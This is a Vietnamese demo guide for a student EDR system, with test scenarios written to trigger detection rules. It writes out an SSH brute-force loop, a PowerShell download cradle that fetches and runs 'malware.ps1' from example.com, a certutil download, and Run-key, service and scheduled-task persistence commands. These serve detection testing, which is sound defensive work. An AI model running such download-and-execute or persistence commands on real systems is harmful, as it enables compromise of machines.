# EDR System Demo Guide

## Tổng quan
Hệ thống EDR (Endpoint Detection and Response) được xây dựng với các thành phần:
- **Backend**: Go server với Sigma rules engine
- **Database**: PostgreSQL lưu trữ events và detections
- **Frontend**: React dashboard hiển thị real-time alerts
- **Data Pipeline**: Winlogbeat + Vector.dev thu thập và xử lý logs

## Chuẩn bị Demo

### 1. Khởi động hệ thống
```bash
# 1. Khởi động EDR Server và Database
cd D:\EDR_V2\deploy
docker-compose up -d

# 2. Khởi động Frontend
cd D:\EDR_V2\frontend
npm start
```

### 2. Kiểm tra hệ thống
- **EDR Server**: http://localhost:8080
- **Frontend Dashboard**: http://localhost:3000
- **Database**: PostgreSQL trên port 5432

## Demo Scenarios

### Scenario 1: SSH Brute Force Attack (HIGH ALERT)

**Mục tiêu**: Tạo ra hàng loạt failed login attempts để trigger brute force detection

**Cách thực hiện**:
```powershell
# Chạy script brute force
.\test_alerts.ps1
```

**Hoặc chạy thủ công**:
```powershell
# Tạo SSH brute force attack
$target = "localhost"
$user = "admin"
$passwords = @("admin", "password", "123456", "root", "test")

for ($i = 1; $i -le 20; $i++) {
    $password = $passwords[($i - 1) % $passwords.Length]
    ssh.exe -o ConnectTimeout=5 -o BatchMode=yes $user@$target "echo test" 2>$null
    Start-Sleep -Milliseconds 500
}
```

**Kết quả mong đợi**:
- EDR sẽ detect brute force pattern
- Alert level: HIGH
- Rule: "Bruteforce enumeration with non existing users (login)"

### Scenario 2: PowerShell Obfuscation (MEDIUM ALERT)

**Mục tiêu**: Chạy PowerShell commands bị obfuscate

**Cách thực hiện**:
```powershell
# 1. PowerShell Encoded Command
powershell.exe -EncodedCommand UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAwAA==

# 2. PowerShell Download Cradle
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')"

# 3. PowerShell Base64 Execution
powershell.exe -Command "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAwAA==')))"
```

**Kết quả mong đợi**:
- EDR sẽ detect PowerShell obfuscation
- Alert level: MEDIUM
- Rule: "Non Interactive PowerShell Process Spawned"

### Scenario 3: Suspicious Process Creation (MEDIUM ALERT)

**Mục tiêu**: Tạo các process đáng ngờ

**Cách thực hiện**:
```powershell
# 1. mshta.exe Execution
mshta.exe javascript:alert('Test')

# 2. wmic.exe Process Creation
wmic.exe process call create "notepad.exe"

# 3. certutil.exe Download
certutil.exe -urlcache -split -f http://example.com/test.txt test.txt

# 4. rundll32.exe Execution
rundll32.exe shell32.dll,ShellExec_RunDLL notepad.exe
```

**Kết quả mong đợi**:
- EDR sẽ detect suspicious process creation
- Alert level: MEDIUM
- Rule: "Suspicious Process Creation"

### Scenario 4: Service Creation (HIGH ALERT)

**Mục tiêu**: Tạo service đáng ngờ

**Cách thực hiện**:
```powershell
# 1. Tạo service
sc.exe create TestService binPath= "C:\Windows\System32\notepad.exe" start= auto

# 2. Khởi động service
sc.exe start TestService

# 3. Cleanup
sc.exe delete TestService
```

**Kết quả mong đợi**:
- EDR sẽ detect service creation
- Alert level: HIGH
- Rule: "Service Creation"

### Scenario 5: Registry Modification (MEDIUM ALERT)

**Mục tiêu**: Sửa đổi registry

**Cách thực hiện**:
```powershell
# 1. Tạo registry key
reg.exe add "HKCU\Software\TestKey" /v TestValue /t REG_SZ /d "TestData" /f

# 2. Sửa đổi run key
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v TestApp /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f

# 3. Cleanup
reg.exe delete "HKCU\Software\TestKey" /f
reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v TestApp /f
```

**Kết quả mong đợi**:
- EDR sẽ detect registry modification
- Alert level: MEDIUM
- Rule: "Registry Modification"

### Scenario 6: Scheduled Task Creation (HIGH ALERT)

**Mục tiêu**: Tạo scheduled task đáng ngờ

**Cách thực hiện**:
```powershell
# 1. Tạo scheduled task
schtasks.exe /create /tn "TestTask" /tr "C:\Windows\System32\notepad.exe" /sc once /st 23:59

# 2. Cleanup
schtasks.exe /delete /tn "TestTask" /f
```

**Kết quả mong đợi**:
- EDR sẽ detect scheduled task creation
- Alert level: HIGH
- Rule: "Scheduled Task Creation"

## Kiểm tra kết quả

### 1. Frontend Dashboard
- Mở http://localhost:3000
- Kiểm tra **Alerts** page để xem real-time alerts
- Kiểm tra **Rules** page để xem rules được trigger
- Kiểm tra **Dashboard** để xem thống kê

### 2. API Endpoints
```bash
# Kiểm tra detections
curl http://localhost:8080/api/v1/detections?limit=10

# Kiểm tra rules
curl http://localhost:8080/api/v1/rules/list?limit=10

# Kiểm tra stats
curl http://localhost:8080/api/v1/stats
```

### 3. Database
```sql
-- Kiểm tra detections
SELECT * FROM detections ORDER BY occurred_at DESC LIMIT 10;

-- Kiểm tra rules
SELECT * FROM rules ORDER BY id DESC LIMIT 10;

-- Kiểm tra endpoints
SELECT * FROM endpoints ORDER BY last_seen DESC LIMIT 10;
```

## Troubleshooting

### 1. EDR Server không khởi động
```bash
# Kiểm tra logs
docker-compose logs edr

# Restart server
docker-compose restart edr
```

### 2. Frontend không load
```bash
# Kiểm tra dependencies
cd frontend
npm install

# Restart frontend
npm start
```

### 3. Không có alerts
- Kiểm tra Winlogbeat service
- Kiểm tra Vector service
- Kiểm tra EDR server logs
- Kiểm tra database connection

## Demo Flow cho Mentor

### 1. Giới thiệu hệ thống (5 phút)
- Mở Frontend Dashboard
- Giải thích các thành phần: Dashboard, Alerts, Rules, Process Tree
- Hiển thị real-time stats

### 2. Demo Detection Engine (10 phút)
- Chạy test script: `.\test_alerts.ps1`
- Quan sát alerts xuất hiện real-time
- Giải thích các loại alerts: HIGH, MEDIUM, LOW
- Hiển thị correlation rules

### 3. Demo Rules Management (5 phút)
- Mở Rules page
- Giải thích các rules được load
- Hiển thị rule details và descriptions
- Giải thích rule triggering

### 4. Demo Process Tree (5 phút)
- Mở Process Tree page
- Giải thích process relationships
- Hiển thị suspicious processes
- Giải thích process analysis

### 5. Q&A (5 phút)
- Trả lời câu hỏi về architecture
- Giải thích technical details
- Thảo luận về improvements

## Kết luận

Hệ thống EDR này cung cấp:
- **Real-time detection** của các hành vi nguy hiểm
- **Comprehensive logging** và analysis
- **User-friendly interface** cho monitoring
- **Scalable architecture** cho enterprise use

Tổng thời gian demo: **30 phút**
